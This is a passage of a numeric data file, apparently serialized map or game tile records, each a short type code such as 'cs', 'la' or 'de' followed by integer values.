32, 1], [1, "s", 1, 207, 34, 1], [1, "s", 1, 202, 23, 1], [1, "s", 1, 195, 16, 1], [1, "s", 2, 222, 28, 1], [1, "s", 2, 212, 38, 1], [1, "s", 2, 207, 23, 1], [1, "s", 2, 202, 12, 1], [1, "s", 2, 195, 18, 1], [1, "s", 1, 191, 12, 1], [1, "s", 0, 187, 16, 1], [1, "s", 2, 188, 16, 1], [1, "s", 1, 186, 14, 1], [1, "s", 1, 201, 16, 1], [1, "g", 1, 216, 31, 1], [1, "g", 0, 200, 15, 1], [1, "g", 0, 202, 40, 1], [1, "g", 0, 189, 32, 1], [1, "g", 0, 204, 28, 1], [1, "g", 0, 196, 24, 1], [1, "g", 2, 198, 37, 1], [1, "s", 0, 193, 39, 1], [1, "s", 0, 201, 45, 1], [1, "a", 0, 210, 29, 1], [1, "a", 0, 200, 20, 1], [1, "cs", 0, 200, 34, 1], [1, "cs", 0, 193, 27, 1], [1, "cs", 1, 203, 30, 1], [1, "cs", 1, 191, 31, 1], [1, "cs", 2, 202, 32, 1], [1, "cs", 2, 194, 26, 1], [1, "cs", 2, 192, 27, 1], [1, "cs", 2, 192, 32, 1], [1, "cs", 2, 203, 31, 1], [1, "cs", 2, 202, 31, 1], [1, "cs", 2, 202, 30, 1], [1, "cs", 3, 202, 29, 1], [1, "cs", 3, 201, 32, 1], [1, "cs", 3, 199, 35, 1], [1, "cs", 0, 193, 34, 1], [1, "cs", 2, 194, 34, 1], [1, "cs", 2, 198, 35, 1], [1, "cs", 3, 199, 34, 1], [1, "cs", 3, 191, 29, 1], [1, "cs", 0, 191, 30, 1], [1, "cs", 3, 190, 29, 1], [1, "la", 3, 180, 69, 1], [1, "la", 3, 182, 68, 1], [1, "la", 3, 184, 68, 1], [1, "la", 3, 186, 70, 1], [1, "la", 3, 184, 72, 1], [1, "la", 3, 182, 72, 1], [1, "la", 3, 180, 71, 1], [1, "cs", 0, 186, 68, 1], [1, "cs", 0, 187, 70, 1], [1, "cs", 0, 183, 74, 1], [1, "cs", 0, 178, 70, 1], [1, "cs", 2, 182, 66, 1], [1, "cs", 2, 182, 74, 1], [1, "cs", 2, 181, 73, 1], [1, "cs", 2, 180, 74, 1], [1, "cs", 2, 181, 74, 1], [1, "la", 0, 184, 70, 1], [1, "la", 3, 182, 70, 1], [1, "cs", 2, 181, 67, 1], [1, "cs", 3, 184, 67, 1], [1, "cs", 3, 182, 67, 1], [1, "la", 4, 187, 69, 1], [1, "la", 1, 188, 68, 1], [1, "la", 4, 189, 68, 1], [1, "la", 2, 190, 68, 1], [1, "la", 1, 191, 68, 1], [1, "la", 4, 192, 68, 1], [1, "la", 2, 193, 68, 1], [1, "la", 4, 194, 69, 1], [1, "la", 2, 194, 70, 1], [1, "la", 5, 195, 71, 1], [1, "la", 1, 194, 71, 1], [1, "la", 2, 196, 72, 1], [1, "la", 4, 196, 71, 1], [1, "la", 1, 197, 73, 1], [1, "la", 5, 196, 73, 1], [1, "la", 5, 198, 73, 1], [1, "la", 3, 201, 73, 1], [1, "la", 3, 203, 72, 1], [1, "la", 4, 199, 73, 1], [1, "la", 1, 205, 72, 1], [1, "la", 2, 206, 72, 1], [1, "la", 5, 207, 72, 1], [1, "la", 1, 208, 72, 1], [1, "la", 1, 209, 73, 1], [1, "la", 2, 209, 74, 1], [1, "la", 5, 211, 76, 1], [1, "la", 4, 210, 75, 1], [1, "la", 5, 212, 76, 1], [1, "la", 4, 202, 75, 1], [1, "la", 2, 203, 76, 1], [1, "la", 4, 204, 77, 1], [1, "la", 2, 204, 78, 1], [1, "la", 2, 204, 79, 1], [1, "la", 5, 204, 80, 1], [1, "cs", 0, 202, 74, 1], [1, "cs", 1, 203, 74, 1], [1, "cs", 2, 204, 73, 1], [1, "cs", 2, 203, 75, 1], [1, "cs", 3, 204, 76, 1], [1, "cs", 3, 205, 73, 1], [1, "cs", 0, 205, 74, 1], [1, "cs", 2, 204, 74, 1], [1, "cs", 2, 204, 75, 1], [1, "cs", 2, 206, 73, 1], [1, "cs", 3, 207, 73, 1], [1, "cs", 2, 205, 76, 1], [1, "cs", 3, 205, 77, 1], [1, "la", 3, 183, 66, 1], [1, "la", 4, 183, 65, 1], [1, "la", 4, 184, 64, 1], [1, "la", 4, 185, 63, 1], [1, "la", 1, 185, 62, 1], [1, "la", 2, 185, 61, 1], [1, "la", 2, 185, 60, 1], [1, "la", 4, 186, 59, 1], [1, "la", 1, 187, 58, 1], [1, "la", 2, 187, 57, 1], [1, "la", 2, 187, 56, 1], [1, "s", 0, 191, 60, 1], [1, "s", 1, 195, 58, 1], [1, "s", 1, 199, 46, 1], [1, "s", 2, 202, 49, 1], [1, "g", 2, 197, 55, 1], [1, "g", 1, 213, 55, 1], [1, "g", 0, 192, 45, 1], [1, "g", 0, 210, 61, 1], [1, "g", 0, 182, 52, 1], [1, "g", 0, 180, 35, 1], [1, "g", 0, 175, 25, 1], [1, "g", 0, 168, 32, 1], [1, "g", 1, 179, 28, 1], [1, "g", 1, 161, 16, 1], [1, "g", 2, 172, 12, 1], [1, "g", 2, 160, 25, 1], [1, "g", 2, 157, 39, 1], [1, "g", 2, 170, 43, 1], [1, "g", 2, 202, 67, 1], [1, "g", 2, 217, 72, 1], [1, "g", 2, 214, 82, 1], [1, "g", 2, 193, 86, 1], [1, "g", 2, 168, 60, 1], [1, "g", 2, 165, 78, 1], [1, "g", 2, 173, 88, 1], [1, "s", 0, 185, 51, 1], [1, "s", 0, 175, 44, 1], [1, "s", 0, 165, 50, 1], [1, "s", 0, 160, 32, 1], [1, "s", 1, 162, 30, 1], [1, "s", 1, 176, 28, 1], [1, "s", 1, 154, 17, 1], [1, "s", 1, 184, 49, 1], [1, "s", 1, 192, 62, 1], [1, "s", 1, 216, 62, 1], [1, "s", 1, 204, 65, 1], [1, "s", 1, 217, 79, 1], [1, "s", 1, 206, 86, 1], [1, "la", 3, 211, 69, 1], [1, "la", 4, 215, 69, 1], [1, "la", 5, 201, 81, 1], [1, "la", 1, 207, 83, 1], [1, "la", 3, 173, 32, 1], [1, "la", 2, 181, 45, 1], [1, "la", 1, 178, 38, 1], [1, "la", 1, 213, 69, 1], [1, "la", 5, 214, 69, 1], [1, "la", 4, 216, 68, 1], [1, "la", 0, 191, 78, 1], [1, "la", 3, 191, 80, 1], [1, "la", 3, 189, 79, 1], [1, "g", 2, 150, 29, 1], [1, "g", 2, 154, 67, 1], [1, "g", 2, 202, 94, 1], [1, "g", 2, 155, 90, 1], [1, "s", 2, 215, 80, 1], [1, "s", 2, 204, 62, 1], [1, "s", 2, 218, 60, 1], [1, "s", 2, 194, 62, 1], [1, "s", 0, 216, 86, 1], [1, "s", 0, 211, 93, 1], [1, "la", 0, 216, 92, 1], [1, "la", 0, 151, 96, 1], [1, "la", 1, 155, 95, 1], [1, "la", 4, 214, 88, 1], [1, "s", 0, 205, 99, 1], [1, "s", 1, 217, 88, 1], [1, "s", 1, 213, 94, 1], [1, "s", 1, 202, 97, 1], [1, "s", 0, 199, 85, 1], [1, "s", 0, 190, 93, 1], [1, "s", 1, 199, 87, 1], [1, "s", 1, 192, 97, 1], [1, "la", 3, 196, 92, 1], [1, "la", 1, 199, 91, 1], [1, "la", 1, 220, 91, 1], [1, "la", 0, 219, 77, 1], [1, "la", 0, 200, 59, 1], [1, "la", 3, 188, 87, 1], [1, "la", 0, 183, 94, 1], [1, "la", 1, 187, 83, 1], [1, "la", 1, 175, 82, 1], [1, "la", 1, 172, 94, 1], [1, "la", 2, 179, 78, 1], [1, "la", 0, 166, 87, 1], [1, "la", 3, 159, 80, 1], [1, "la", 3, 167, 15, 1], [1, "la", 1, 164, 17, 1], [1, "la", 1, 172, 28, 1], [1, "la", 3, 153, 24, 1], [1, "la", 4, 164, 91, 1], [1, "la", 4, 156, 82, 1], [1, "la", 4, 149, 90, 1], [1, "s", 0, 178, 85, 1], [1, "s", 1, 180, 85, 1], [1, "s", 0, 163, 96, 1], [1, "s", 0, 159, 86, 1], [1, "s", 0, 185, 78, 1], [1, "s", 1, 194, 75, 1], [1, "s", 2, 195, 76, 1], [1, "s", 2, 181, 78, 1], [1, "s", 2, 161, 87, 1], [1, "s", 2, 166, 97, 1], [1, "s", 2, 177, 97, 1], [1, "s", 0, 149, 85, 1], [1, "s", 1, 151, 83, 1], [1, "s", 1, 175, 74, 1], [1, "s", 0, 174, 72, 1], [1, "la", 3, 168, 71, 1], [1, "la", 3, 180, 60, 1], [1, "s", 0, 156, 63, 1], [1, "s", 0, 151, 47, 1], [1, "s", 1, 158, 64, 1], [1, "s", 1, 161, 75, 1], [1, "s", 1, 162, 51, 1], [1, "s", 1, 175, 45, 1], [1, "s", 1, 152, 47, 1], [1, "s", 1, 159, 33, 1], [1, "s", 1, 152, 18, 1], [1, "s", 0, 151, 13, 1], [1, "s", 0, 166, 22, 1], [1, "s", 0, 170, 63, 1], [1, "s", 2, 172, 62, 1], [1, "s", 2, 155, 61, 1], [1, "s", 2, 167, 51, 1], [1, "s", 2, 150, 52, 1], [1, "la", 4, 178, 69, 1], [1, "la", 4, 177, 68, 1], [1, "la", 3, 176, 67, 1], [1, "la", 0, 174, 67, 1], [1, "la", 1, 172, 67, 1], [1, "la", 4, 171, 67, 1], [1, "la", 4, 170, 66, 1], [1, "la", 4, 169, 66, 1], [1, "la", 1, 168, 66, 1], [1, "la", 4, 167, 67, 1], [1, "la", 1, 166, 67, 1], [1, "la", 4, 165, 68, 1], [1, "la", 5, 164, 68, 1], [1, "la", 2, 163, 68, 1], [1, "la", 5, 162, 68, 1], [1, "la", 2, 161, 68, 1], [1, "la", 3, 153, 72, 1], [1, "la", 3, 163, 60, 1], [1, "la", 3, 164, 42, 1], [1, "la", 0, 155, 51, 1], [1, "la", 1, 168, 42, 1], [1, "la", 4, 158, 48, 1], [1, "la", 4, 178, 57, 1], [1, "la", 4, 151, 69, 1], [1, "la", 2, 170, 74, 1], [1, "la", 2, 160, 84, 1], [1, "la", 2, 174, 92, 1], [1, "la", 2, 188, 90, 1], [1, "la", 2, 209, 84, 1], [1, "la", 2, 206, 93, 1], [1, "la", 5, 156, 70, 1], [1, "la", 5, 165, 57, 1], [1, "la", 5, 182, 58, 1], [1, "la", 5, 166, 44, 1], [1, "la", 1, 163, 39, 1], [1, "la", 1, 152, 53, 1], [1, "la", 1, 152, 37, 1], [1, "la", 2, 163, 13, 1], [1, "de", 12, 219, 12, 0], [1, "de", 14, 203, 13, 0], [1, "de", 15, 220, 19, 0], [1, "de", 12, 223, 15, 0], [1, "de", 12, 213, 10, 0], [1, "de", 37, 217, 19, 0], [1, "de", 38, 220, 14, 0], [1, "de", 38, 215, 10, 0], [1, "de", 40, 214, 14, 0], [1, "de", 40, 222, 16, 0], [1, "de", 40, 209, 18, 0], [1, "de", 37, 212, 18, 0], [1, "de", 38, 215, 26, 0], [1, "de", 37, 222, 25, 0], [1, "de", 40, 221, 29, 0], [1, "de", 12, 220, 27, 0], [1, "de", 13, 213, 27, 0], [1, "de", 14, 215, 30, 0], [1, "de", 15, 219, 33, 0], [1, "de", 38, 220, 31, 0], [1, "de", 38, 217, 35, 0], [1, "de", 40, 221, 34, 0], [1, "de", 39, 215, 32, 0], [1, "de", 37, 211, 35, 0], [1, "de", 12, 223, 38, 0], [1, "de", 13, 213, 38, 0], [1, "de", 14, 222, 44, 0], [1, "de", 15, 208, 33, 0], [1, "de", 15, 206, 23, 0], [1, "de", 13, 205, 28, 0], [1, "de", 14, 211, 23, 0], [1, "de", 14, 201, 20, 0], [1, "de", 15, 198, 9, 0], [1, "de", 15, 199, 16, 0], [1, "de", 12, 194, 15, 0], [1, "de", 12, 197, 23, 0], [1, "de", 37, 205, 13, 0], [1, "de", 39, 204, 9, 0], [1, "de", 40, 196, 12, 0], [1, "de", 40, 198, 18, 0], [1, "de", 37, 192, 11, 0], [1, "de", 37, 199, 24, 0], [1, "de", 37, 209, 24, 0], [1, "de", 39, 209, 30, 0], [1, "de", 39, 204, 31, 0], [1, "de", 39, 192, 24, 0], [1, "de", 40, 187, 23, 0], [1, "de", 38, 187, 18, 0], [1, "de", 39, 192, 18, 0], [1, "de", 37, 185, 15, 0], [1, "de", 12, 188, 15, 0], [1, "de", 13, 185, 13, 0], [1, "de", 14, 189, 9, 0], [1, "de", 15, 187, 22, 0], [1, "de", 15, 180, 9, 0], [1, "de", 12, 177, 14, 0], [1, "de", 14, 173, 9, 0], [1, "de", 14, 171, 15, 0], [1, "de", 40, 182, 9, 0], [1, "de", 39, 179, 13, 0], [1, "de", 39, 175, 9, 0], [1, "de", 40, 173, 14, 0], [1, "de", 37, 169, 11, 0], [1, "de", 37, 163, 10, 0], [1, "de", 38, 164, 15, 0], [1, "de", 39, 170, 20, 0], [1, "de", 40, 160, 17, 0], [1, "de", 40, 154, 10, 0], [1, "de", 40, 165, 23, 0], [1, "de", 40, 150, 19, 0], [1, "de", 37, 155, 16, 0], [1, "de", 39, 146, 10, 0], [1, "de", 12, 159, 12, 0], [1, "de", 13, 151, 9, 0], [1, "de", 14, 150, 14, 0], [1, "de", 15, 153, 19, 0], [1, "de", 13, 161, 25, 0], [1, "de", 14, 169, 25, 0], [1, "de", 15, 176, 25, 0], [1, "de", 12, 180, 29, 0], [1, "de", 12, 188, 31, 0], [1, "de", 14, 181, 36, 0], [1, "de", 37, 186, 33, 0], [1, "de", 38, 183, 26, 0], [1, "de", 39, 177, 21, 0], [1, "de", 40, 175, 31, 0], [1, "de", 37, 176, 39, 0], [1, "de", 37, 168, 34, 0], [1, "de", 38, 162, 32, 0], [1, "de", 38, 168, 45, 0], [1, "de", 38, 173, 45, 0], [1, "de", 39, 160, 35, 0], [1, "de", 40, 161, 42, 0], [1, "de", 40, 170, 39, 0], [1, "de", 40, 181, 43, 0], [1, "de", 40, 156, 26, 0], [1, "de", 40, 150, 32, 0], [1, "de", 37, 159, 26, 0], [1, "de", 37, 155, 40, 0], [1, "de", 37, 154, 45, 0], [1, "de", 39, 149, 45, 0], [1, "de", 40, 150, 50, 0], [1, "de", 40, 160, 52, 0], [1, "de", 37, 164, 52, 0], [1, "de", 38, 168, 50, 0], [1, "de", 12, 176, 45, 0], [1, "de", 12, 167, 32, 0], [1, "de", 13, 158, 32, 0], [1, "de", 14, 149, 28, 0], [1, "de", 15, 163, 30, 0], [1, "de", 14, 158, 39, 0], [1, "de", 12, 171, 43, 0], [1, "de", 12, 174, 36, 0], [1, "de", 12, 151, 43, 0], [1, "de", 13, 152, 48, 0], [1, "de", 14, 164, 49, 0], [1, "de", 15, 149, 52, 0], [1, "de", 12, 174, 49, 0], [1, "de", 13, 183, 51, 0], [1, "de", 14, 186, 48, 0], [1, "de", 37, 182, 48, 0], [1, "de", 38, 187, 52, 0], [1, "de", 39, 188, 43, 0], [1, "de", 37, 200, 38, 0], [1, "de", 40, 194, 37, 0], [1, "de", 39, 199, 44, 0], [1, "de", 38, 200, 49, 0], [1, "de", 37, 196, 54, 0], [1, "de", 12, 194, 40, 0], [1, "de", 13, 202, 45, 0], [1, "de", 14, 198, 47, 0], [1, "de", 15, 198, 55, 0], [1, "de", 15, 212, 54, 0], [1, "de", 15, 216, 63, 0], [1, "de", 14, 209, 62, 0], [1, "de", 12, 219, 60, 0], [1, "de", 12, 206, 56, 0], [1, "de", 12, 218, 72, 0], [1, "de", 12, 223, 67, 0], [1, "de", 12, 205, 64, 0], [1, "de", 12, 193, 63, 0], [1, "de", 14, 216, 80, 0], [1, "de", 14, 222, 87, 0], [1, "de", 38, 210, 53, 0], [1, "de", 37, 210, 47, 0], [1, "de", 37, 200, 63, 0], [1, "de", 37, 218, 62, 0], [1, "de", 37, 222, 60, 0], [1, "de", 37, 207, 70, 0], [1, "de", 38, 203, 68, 0], [1, "de", 38, 195, 66, 0], [1, "de", 38, 218, 55, 0], [1, "de", 38, 212, 61, 0], [1, "de", 38, 222, 70, 0], [1, "de", 38, 218, 70, 0], [1, "de", 40, 222, 81, 0], [1, "de", 38, 214, 79, 0], [1, "de", 39, 213, 83, 0], [1, "de", 39, 207, 76, 0], [1, "de", 39, 208, 86, 0], [1, "de", 39, 218, 87, 0], [1, "de", 39, 222, 93, 0], [1, "de", 39, 216, 96, 0], [1, "de", 39, 209, 94, 0], [1, "de", 39, 201, 87, 0], [1, "de", 39, 198, 82, 0], [1, "de", 39, 207, 99, 0], [1, "de", 39, 200, 97, 0], [1, "de", 39, 202, 92, 0], [1, "de", 37, 194, 97, 0], [1, "de", 39, 204, 88, 0], [1, "de", 39, 189, 90, 0], [1, "de", 39, 194, 81, 0], [1, "de", 39, 188, 98, 0], [1, "de", 37, 183, 91, 0], [1, "de", 37, 186, 80, 0], [1, "de", 37, 191, 72, 0], [1, "de", 38, 184, 77, 0], [1, "de", 38, 180, 80, 0], [1, "de", 39, 173, 75, 0], [1, "de", 40, 178, 87, 0], [1, "de", 40, 174, 94, 0], [1, "de", 40, 192, 93, 0], [1, "de", 40, 165, 92, 0], [1, "de", 37, 160, 89, 0], [1, "de", 38, 161, 85, 0], [1, "de", 38, 164, 98, 0], [1, "de", 38, 151, 99, 0], [1, "de", 38, 151, 85, 0], [1, "de", 40, 148, 83, 0], [1, "de", 40, 160, 77, 0], [1, "de", 40, 167, 77, 0], [1, "de", 40, 153, 69, 0], [1, "de", 40, 149, 74, 0], [1, "de", 37, 161, 64, 0], [1, "de", 37, 154, 61, 0], [1, "de", 39, 157, 55, 0], [1, "de", 39, 174, 64, 0], [1, "de", 39, 175, 56, 0], [1, "de", 39, 149, 67, 0], [1, "de", 12, 218, 96, 0], [1, "de", 13, 212, 95, 0], [1, "de", 14, 204, 85, 0], [1, "de", 15, 215, 85, 0], [1, "de", 15, 197, 97, 0], [1, "de", 12, 198, 87, 0], [1, "de", 14, 196, 77, 0], [1, "de", 13, 194, 86, 0], [1, "de", 15, 181, 84, 0], [1, "de", 14, 184, 79, 0], [1, "de", 14, 188, 93, 0], [1, "de", 13, 180, 87, 0], [1, "de", 13, 178, 96, 0], [1, "de", 13, 163, 95, 0], [1, "de", 15, 172, 88, 0], [1, "de", 15, 176, 75, 0], [1, "de", 14, 172, 72, 0], [1, "de", 14, 169, 82, 0], [1, "de", 13, 164, 78, 0], [1, "de", 13, 158, 87, 0], [1, "de", 13, 149, 86, 0], [1, "de", 15, 154, 91, 0], [1, "de", 15, 160, 74, 0], [1, "de", 14, 152, 76, 0], [1, "de", 14, 158, 63, 0], [1, "de", 14, 150, 60, 0], [1, "de", 12, 169, 59, 0], [1, "de", 13, 173, 61, 0], [1, "cs", 1, 143, 104, 1], [1, "cs", 0, 141, 102, 1], [1, "cs", 3, 138, 102, 1], [1, "cs", 2, 139, 102, 1], [1, "cs", 2, 140, 102, 1], [1, "cs", 3, 143, 107, 1], [1, "cs", 0, 143, 106, 1], [1, "cs", 2, 143, 105, 1], [1, "cs", 2, 142, 103, 1], [1, "cs", 0, 142, 104, 1], [1, "cs", 2, 141, 103, 1], [1, "cs", 3, 142, 105, 1], [1, "cs", 3, 140, 103, 1], [1, "cs", 3, 141, 104, 1], [1, "la", 4, 151, 23, 1], [1, "la", 4, 150, 22, 1], [1, "la", 1, 149, 21, 1], [1, "la", 4, 148, 21, 1], [1, "la", 2, 147, 20, 1], [1, "la", 4, 147, 19, 1], [1, "la", 5, 147, 18, 1], [1, "la", 1, 147, 17, 1], [1, "la", 3, 144, 9, 1], [1, "la", 5, 147, 16, 1], [1, "la", 2, 147, 15, 1], [1, "la", 4, 147, 14, 1], [1, "la", 4, 145, 11, 1], [1, "la", 5, 145, 12, 1], [1, "la", 1, 146, 13, 1], [1, "la", 2, 145, 13, 1], [1, "la", 3, 155, 25, 1], [1, "la", 0, 155, 24, 1], [1, "la", 3, 153, 26, 1], [1, "cs", 0, 151, 24, 1], [1, "cs", 0, 153, 22, 1], [1, "cs", 3, 152, 22, 1], [1, "cs", 3, 154, 22, 1], [1, "cs", 1, 157, 26, 1], [1, "cs", 2, 157, 24, 1], [1, "cs", 2, 156, 26, 1], [1, "cs", 2, 154, 28, 1], [1, "cs", 2, 151, 26, 1], [1, "cs", 2, 152, 25, 1], [1, "cs", 2, 151, 25, 1], [1, "cs", 2, 156, 27, 1], [1, "cs", 2, 157, 23, 1], [1, "cs", 2, 157, 22, 1], [1, "cs", 3, 150, 24, 1], [1, "cs", 3, 150, 23, 1], [1, "de", 38, 155, 29, 0], [1, "de", 12, 157, 27, 0], [1, "de", 14, 153, 29, 0], [1, "de", 15, 158, 23, 0], [1, "de", 13, 156, 21, 0], [1, "de", 13, 147, 36, 0], [1, "de", 13, 161, 56, 0], [1, "de", 13, 147, 79, 0], [1, "de", 12, 157, 99, 0], [1, "de", 12, 172, 99, 0], [1, "la", 3, 143, 102, 1], [1, "la", 4, 149, 96, 1], [1, "la", 4, 145, 102, 1], [1, "la", 1, 148, 97, 1], [1, "la", 5, 148, 98, 1], [1, "cs", 3, 144, 104, 1], [1, "cs", 3, 144, 103, 1], [1, "cs", 3, 145, 103, 1], [1, "cs", 3, 145, 104, 1], [1, "cs", 3, 142, 101, 1], [1, "cs", 3, 143, 100, 1], [1, "cs", 3, 141, 101, 1], [1, "cs", 3, 142, 100, 1], [1, "cs", 0, 141, 100, 1], [1, "cs", 2, 140, 101, 1], [1, "cs", 2, 144, 105, 1], [1, "cs", 3, 146, 103, 1], [1, "cs", 3, 146, 102, 1], [1, "cs", 3, 150, 95, 1], [1, "cs", 0, 150, 97, 1], [1, "cs", 2, 151, 98, 1], [1, "cs", 0, 153, 97, 1], [1, "cs", 3, 153, 96, 1], [1, "cs", 2, 149, 95, 1], [1, "s", 0, 213, 127, 1], [1, "plm", 1, 214, 131, 0], [1, "plm", 1, 207, 128, 0], [1, "plm", 0, 208, 127, 0], [1, "s", 1, 207, 132, 1], [1, "s", 2, 208, 133, 1], [1, "plm", 0, 217, 132, 0], [1, "plm", 2, 186, 158, 0], [1, "plm", 0, 184, 160, 0], [1, "s", 1, 183, 156, 1], [1, "s", 2, 186, 159, 1], [1, "p", 0, 182, 157, 1], [1, "p", 0, 114, 205, 1], [1, "plm", 1, 117, 204, 0], [1, "plm", 0, 117, 205, 0], [1, "plm", 2, 112, 204, 0], [1, "s", 2, 114, 207, 1], [1, "s", 2, 115, 204, 1], [1, "plm", 2, 122, 151, 0], [1, "plm", 1, 123, 150, 0], [1, "plm", 1, 117, 151, 0], [1, "s", 0, 118, 150, 1], [1, "s", 1, 122, 152, 1], [1, "plm", 2, 156, 130, 0], [1, "plm", 1, 154, 127, 0], [1, "s", 0, 153, 128, 1], [1, "s", 2, 152, 130, 1], [1, "p", 0, 123, 65, 1], [1, "plm", 2, 125, 62, 0], [1, "plm", 1, 124, 62, 0], [1, "plm", 0, 120, 65, 0], [1, "s", 1, 125, 63, 1], [1, "s", 1, 121, 64, 1], [1, "s", 2, 122, 62, 1], [1, "cs", 0, 140, 106, 1], [1, "cs", 2, 144, 106, 1], [1, "cs", 2, 145, 105, 1], [1, "cs", 2, 144, 107, 1], [1, "cs", 2, 141, 106, 1], [1, "cs", 2, 141, 105, 1], [1, "cs", 2, 140, 105, 1], [1, "cs", 2, 140, 104, 1], [1, "cs", 1, 138, 103, 1], [1, "cs", 0, 139, 104, 1], [1, "cs", 2, 139, 103, 1], [1, "cs", 2, 139, 105, 1], [1, "cs", 2, 142, 106, 1], [1, "cs", 2, 142, 107, 1], [1, "cs", 2, 139, 101, 1], [1, "de", 19, 27, 264, 0], [1, "la", 4, 147, 99, 1], [1, "la", 1, 146, 100, 1], [1, "la", 4, 145, 101, 1], [1, "cs", 1, 215, 47, 1], [1, "cs", 2, 216, 47, 1], [1, "cs", 2, 215, 48, 1], [1, "la", 4, 214, 45, 1], [1, "la", 4, 215, 45, 1], [1, "la", 0, 216, 46, 1], [1, "la", 4, 216, 48, 1], [1, "la", 4, 216, 49, 1], [1, "la", 4, 217, 50, 1], [1, "la", 3, 214, 49, 1], [1, "la", 4, 211, 45, 1], [1, "la", 3, 213, 47, 1], [1, "cs", 2, 224, 48, 1], [1, "plm", 2, 111, 243, 0], [1, "plm", 1, 108, 246, 0], [1, "s", 1, 110, 243, 1], [1, "s", 0, 108, 245, 1], [1, "s", 0, 121, 276, 1], [1, "plm", 2, 122, 277, 0], [1, "plm", 2, 117, 276, 0], [1, "plm", 1, 118, 277, 0], [1, "s", 1, 118, 278, 1], [1, "cs", 2, 66, 16, 1], [1, "cs", 3, 67, 16, 1], [1, "cs", 0, 67, 17, 1], [1, "cs", 2, 66, 17, 1], [1, "cs", 3, 66, 18, 1], [1, "cs", 3, 68, 17, 1], [1, "cs", 0, 36, 16, 1], [1, "cs", 2, 36, 17, 1], [1, "cs", 2, 36, 18, 1], [1, "cs", 3, 35, 17, 1], [1, "cs", 3, 36, 19, 1], [1, "cs", 3, 35, 18, 1], [1, "cs", 2, 66, 30, 1], [1, "cs", 2, 66, 23, 1], [1, "cs", 3, 66, 22, 1], [1, "cs", 3, 66, 31, 1], [1, "cs", 2, 36, 30, 1], [1, "cs", 2, 36, 23, 1], [1, "cs", 1, 36, 22, 1], [1, "cs", 2, 36, 31, 1], [1, "cs", 3, 42, 13, 1], [1, "cs", 0, 43, 13, 1], [1, "cs", 2, 44, 13, 1], [1, "cs", 3, 42, 16, 1], [1, "cs", 3, 41, 16, 1], [1, "cs", 3, 40, 16, 1], [1, "cs", 0, 42, 19, 1], [1, "cs", 3, 43, 19, 1], [1, "cs", 3, 44, 19, 1], [1, "cs", 3, 45, 19, 1], [1, "cs", 2, 46, 19, 1], [1, "cs", 0, 43, 22, 1], [1, "cs", 2, 42, 22, 1], [1, "cs", 1, 41, 22, 1], [1, "cs", 0, 40, 22, 1], [1, "cs", 3, 39, 17, 1], [1, "cs", 1, 44, 26, 1], [1, "cs", 2, 45, 26, 1], [1, "cs", 3, 46, 26, 1], [1, "cs", 0, 47, 26, 1], [1, "cs", 2, 48, 26, 1], [1, "cs", 3, 47, 25, 1], [1, "cs", 3, 43, 27, 1], [1, "cs", 1, 49, 32, 1], [1, "cs", 2, 50, 32, 1], [1, "cs", 2, 51, 32, 1], [1, "cs", 2, 52, 32, 1], [1, "d", 0, 51, 29, 1], [1, "d", 1, 53, 29, 1], [1, "d", 1, 49, 29, 1], [1, "cs", 3, 55, 31, 1], [1, "cs", 3, 54, 32, 1], [1, "cs", 3, 47, 31, 1], [1, "cs", 3, 48, 32, 1], [1, "cs", 0, 51, 33, 1], [1, "cs", 2, 52, 33, 1], [1, "cs", 2, 50, 33, 1], [1, "cs", 3, 56, 30, 1], [1, "cs", 3, 56, 31, 1], [1, "cs", 3, 46, 30, 1], [1, "cs", 3, 46, 31, 1], [1, "cs", 1, 53, 33, 1], [1, "cs", 2, 49, 33, 1], [1, "cs", 2, 53, 32, 1], [1, "cs", 0, 55, 32, 1], [1, "cs", 0, 47, 32, 1], [1, "d", 1, 54, 35, 1], [1, "fo", 2, 35, 15, 0], [1, "fo", 2, 36, 12, 0], [1, "fo", 2, 67, 15, 0], [1, "cs", 3, 60, 13, 1], [1, "cs", 2, 59, 13, 1], [1, "cs", 1, 58, 13, 1], [1, "cs", 3, 62, 16, 1], [1, "cs", 0, 61, 16, 1], [1, "cs", 3, 60, 16, 1], [1, "cs", 3, 63, 17, 1], [1, "cs", 2, 60, 19, 1], [1, "cs", 1, 59, 19, 1], [1, "cs", 3, 58, 19, 1], [1, "cs", 2, 57, 19, 1], [1, "cs", 2, 56, 19, 1], [1, "cs", 0, 55, 18, 1], [1, "cs", 2, 55, 17, 1], [1, "cs", 2, 63, 23, 1], [1, "cs", 0, 62, 22, 1], [1, "cs", 2, 61, 22, 1], [1, "cs", 1, 60, 22, 1], [1, "cs", 0, 59, 22, 1], [1, "cs", 2, 54, 26, 1], [1, "cs", 2, 55, 26, 1], [1, "cs", 2, 56, 26, 1], [1, "cs", 1, 57, 26, 1], [1, "cs", 2, 58, 26, 1], [1, "cs", 2, 59, 27, 1], [1, "cs", 2, 68, 16, 1], [1, "cs", 2, 68, 15, 1], [1, "cs", 3, 69, 15, 1], [1, "cs", 3, 70, 15, 1], [1, "cs", 3, 70, 14, 1], [1, "cs", 1, 69, 14, 1], [1, "cs", 1, 69, 16, 1], [1, "cs", 2, 71, 13, 1], [1, "cs", 2, 71, 14, 1], [1, "cs", 3, 72, 13, 1], [1, "cs", 3, 70, 8, 1], [1, "cs", 3, 71, 8, 1], [1, "cs", 2, 72, 8, 1], [1, "cs", 0, 73, 8, 1], [1, "cs", 3, 74, 9, 1], [1, "cs", 3, 74, 8, 1], [1, "cs", 0, 75, 8, 1], [1, "cs", 3, 76, 8, 1], [1, "cs", 3, 75, 9, 1], [1, "cs", 3, 75, 10, 1], [1, "cs", 0, 76, 10, 1], [1, "cs", 0, 76, 16, 1], [1, "cs", 3, 76, 15, 1], [1, "cs", 3, 75, 16, 1], [1, "cs", 2, 77, 11, 1], [1, "cs", 2, 77, 14, 1], [1, "cs", 3, 77, 12, 1], [1, "cs", 3, 77, 13, 1], [1, "cs", 3, 77, 15, 1], [1, "cs", 0, 74, 18, 1], [1, "cs", 1, 75, 17, 1], [1, "cs", 2, 74, 17, 1], [1, "cs", 3, 73, 19, 1], [1, "cs", 3, 67, 23, 1], [1, "cs", 0, 68, 23, 1], [1, "cs", 0, 72, 20, 1], [1, "cs", 2, 73, 20, 1], [1, "cs", 2, 74, 19, 1], [1, "cs", 2, 74, 36, 1], [1, "cs", 2, 77, 27, 1], [1, "cs", 2, 76, 26, 1], [1, "cs", 2, 75, 26, 1], [1, "cs", 0, 74, 26, 1], [1, "cs", 2, 75, 25, 1], [1, "cs", 0, 76, 25, 1], [1, "cs", 1, 77, 23, 1], [1, "cs", 2, 77, 16, 1], [1, "cs", 2, 76, 17, 1], [1, "cs", 2, 76, 